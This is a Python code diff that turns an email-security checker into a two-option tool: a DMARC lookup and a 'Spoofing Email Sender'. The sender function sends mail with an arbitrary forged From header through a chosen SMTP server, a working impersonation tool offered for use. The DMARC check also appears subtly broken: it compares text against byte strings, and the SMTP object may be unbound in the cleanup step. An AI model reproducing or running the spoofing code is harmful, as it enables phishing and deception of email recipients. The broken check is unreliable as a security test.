@@ -1,52 +1,58 @@
+import smtplib
 import dns.resolver
 
-def has_dkim_record(domain):
-    try:
-        dns.resolver.query(f"_adsp._domainkey.{domain}", 'TXT')
-        return True
-    except dns.resolver.NoAnswer:
-        return False
-    except Exception as e:
-        print(f"An unexpected error occurred while checking for DKIM record: {e}")
-        return False
-
-def is_domain_secure(domain):
-    resolver = dns.resolver.Resolver()
-    resolver.timeout = 1
-    resolver.lifetime = 1
-
-    try:
-        spf_found = False
-        spf_record = resolver.query(domain, 'TXT')
-        for rdata in spf_record:
-            if 'v=spf1' in rdata.strings:
-                spf_found = True
+def main():
+    while True:
+        choice = input("Choose an option: \n1. DMARC Checker\n2. Spoofing Email Sender\nEnter choice (1 or 2): ")
+        
+        if choice == '1':
+            domain = input("Enter domain: ")
+            try:
+                check_dmarc(domain)
+            except ValueError as e:
+                print(e)
+                continue
+            else:
+                print(f"{domain} is secure by email")
                 break
-        dmarc_found = False
-        dmarc_record = resolver.query(f"_dmarc.{domain}", 'TXT')
-        for rdata in dmarc_record:
-            if 'v=DMARC1' in rdata.strings:
-                dmarc_found = True
+        elif choice == '2':
+            domain = input("Enter domain: ")
+            email_from = input("Enter email header 'From' field: ")
+            email_body = input("Enter email body text: ")
+            email_to = input("Enter recipient email: ")
+            email_sender = input("Enter sender email: ")
+            try:
+                spoof_email(domain, email_from, email_body, email_to, email_sender)
+            except ValueError as e:
+                print(e)
+                continue
+            else:
+                print("Email sent successfully")
                 break
-        return spf_found and has_dkim_record(domain) and dmarc_found
+        else:
+            print("Invalid choice. Please enter 1 or 2.")
+            continue
+
+def check_dmarc(domain):
+    try:
+        answers = dns.resolver.query(f'_dmarc.{domain}', 'TXT')
     except dns.resolver.NXDOMAIN:
-        print(f"The domain {domain} does not exist.")
-        return False
-    except dns.resolver.NoAnswer:
-        print(f"No TXT record found for {domain}.")
-        return False
-    except Exception as e:
-        print(f"An unexpected error occurred while checking domain security: {e}")
-        return False
-
-def check_domain_security(domain):
-    if is_domain_secure(domain):
-        print(f"{domain} is secured properly with SPF, DKIM, and DMARC.")
+        raise ValueError(f"{domain} is not a valid domain")
     else:
-        print(f"{domain} is not secured properly with SPF, DKIM, and DMARC.")
+        for rdata in answers:
+            if "v=DMARC1" in rdata.strings:
+                return True
+        raise ValueError(f"{domain} does not have a DMARC record")
 
-domain = input("Enter a domain to check: ")
-if domain:
-    check_domain_security(domain.strip())
-else:
-    print("Please enter a valid domain.")
+def spoof_email(domain, email_from, email_body, email_to, email_sender):
+    message = f"From: {email_from}\nTo: {email_to}\nSubject: Spoofed Email\n\n{email_body}"
+    try:
+        smtp_server = smtplib.SMTP(domain)
+        smtp_server.sendmail(email_sender, email_to, message)
+    except smtplib.SMTPException:
+        raise ValueError("Unable to send email")
+    finally:
+        smtp_server.quit()
+
+if __name__ == '__main__':
+    main()
